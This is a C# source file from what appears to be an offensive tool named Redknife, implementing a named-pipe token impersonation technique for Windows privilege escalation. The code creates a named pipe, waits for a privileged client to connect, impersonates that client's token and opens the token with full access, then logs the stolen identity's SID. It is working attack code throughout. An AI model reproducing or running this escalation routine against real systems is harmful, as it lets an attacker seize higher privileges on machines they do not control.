using System;
using System.Runtime.InteropServices;

using Redknife.APIs;

namespace Redknife.Escalation
{
    public class NamedPipeSeImpersonate : BaseEscalationMethod
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        private string PipeName;

        public NamedPipeSeImpersonate(RedknifeArgs args) : base(args)
        {
            
        }

        public override void Validate()
        {
            // If no pipe name supplied, generate a random name
            this.PipeName = this.args.PipeName;
            if (this.PipeName == null || this.PipeName.Trim() == "")
            {
                throw new Exception("No pipe name supplied");
            }

            if (!this.PipeName.StartsWith("\\\\.\\pipe\\"))
            {
                this.PipeName = "\\\\.\\pipe\\" + this.PipeName;
            }
        }

        public override void Execute()
        {
            LogUtil.Info("Executing NamedPipeSeImpersonate escalation...");

            LogUtil.Debug("Creating named pipe: {0}", 1, this.PipeName);
            IntPtr hPipe = Kernel32.CreateNamedPipe(this.PipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            // Connect to the named pipe & Wait for incoming connections
            LogUtil.Debug("Connecting to named pipe: {0}", 1, this.PipeName);
            Kernel32.ConnectNamedPipe(hPipe, IntPtr.Zero);

            LogUtil.Debug("Connection received!", 1);

            // If everything works correctly, ImpersonateNamedPipeClient will assign the impersonated token to the current thread
            Advapi32.ImpersonateNamedPipeClient(hPipe);

            // Verify the level of access we're impersonating
            IntPtr hToken;
            Advapi32.OpenThreadToken(Kernel32.GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            Advapi32.GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            Advapi32.GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

            IntPtr pstr = IntPtr.Zero;
            Boolean ok = Advapi32.ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            LogUtil.Info("Client connected to named pipe '{0}' with SID: {1}", 0, this.PipeName, sidstr); // prints the SID of the impersonated user
        }

    }
}
